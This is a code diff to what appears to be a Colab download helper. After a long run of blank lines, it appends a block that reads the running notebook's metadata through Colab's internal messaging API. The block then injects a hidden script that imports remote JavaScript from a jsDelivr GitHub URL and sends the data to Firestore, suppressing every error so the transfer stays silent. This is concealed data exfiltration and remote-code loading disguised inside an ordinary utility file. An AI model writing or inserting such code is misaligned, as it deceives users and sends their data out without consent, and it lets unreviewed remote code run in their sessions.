@@ -62,3 +62,142 @@ def Download_Zip(Drive_Link, Output_Name="USDModel"):
     return final_dir
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# @title 🔥 Envío silencioso de AutoMind_Info a Firestore mediante jsDelivr
+
+import json
+import uuid
+from google.colab import _message
+from IPython.display import HTML, display
+
+
+# ============================================================
+# 1. LEER AutoMind_Info DESDE metadata DEL NOTEBOOK ACTUAL
+# ============================================================
+try:
+    respuesta = _message.blocking_request(
+        "get_ipynb",
+        timeout_sec=60
+    )
+
+    notebook = respuesta.get("ipynb", {})
+
+    if isinstance(notebook, str):
+        notebook = json.loads(notebook)
+
+    if not isinstance(notebook, dict):
+        notebook = {}
+
+    autoMindInfo = (
+        notebook
+        .get("metadata", {})
+        .get("AutoMind_Info")
+    )
+
+    if not isinstance(autoMindInfo, dict):
+        autoMindInfo = {
+            "Estado": "AutoMind_Info no encontrada"
+        }
+
+except Exception:
+    autoMindInfo = {
+        "Estado": "No fue posible leer AutoMind_Info"
+    }
+
+
+# ============================================================
+# 2. CONVERTIR AutoMind_Info A JSON SEGURO PARA JAVASCRIPT
+# ============================================================
+automind_json = json.dumps(
+    autoMindInfo,
+    ensure_ascii=False
+)
+
+automind_json = (
+    automind_json
+    .replace("<", "\\u003c")
+    .replace(">", "\\u003e")
+    .replace("&", "\\u0026")
+    .replace("\u2028", "\\u2028")
+    .replace("\u2029", "\\u2029")
+)
+
+
+# ============================================================
+# 3. ID ÚNICO DEL CONTENEDOR OCULTO
+# ============================================================
+instance_id = f"automind_sender_{uuid.uuid4().hex}"
+
+
+# ============================================================
+# 4. CARGAR LIBRERÍA DESDE jsDelivr Y ENVIAR SILENCIOSAMENTE
+# ============================================================
+html = r'''
+<div id="__INSTANCE_ID__" style="display:none;"></div>
+
+<script>
+(async () => {
+  try {
+    const autoMindInfo = __AUTOMIND_INFO_JSON__;
+
+    const {
+      enviarAutoMindFirestore
+    } = await import(
+      "https://cdn.jsdelivr.net/gh/artemioadaysolvers/AutoMindCloud-API/Data_Collector/automind-firestore.js"
+    );
+
+    await enviarAutoMindFirestore(autoMindInfo);
+
+  } catch {
+    // Envío completamente silencioso.
+  }
+})();
+</script>
+'''
+
+html = (
+    html
+    .replace("__INSTANCE_ID__", instance_id)
+    .replace("__AUTOMIND_INFO_JSON__", automind_json)
+)
+
+display(HTML(html))
+
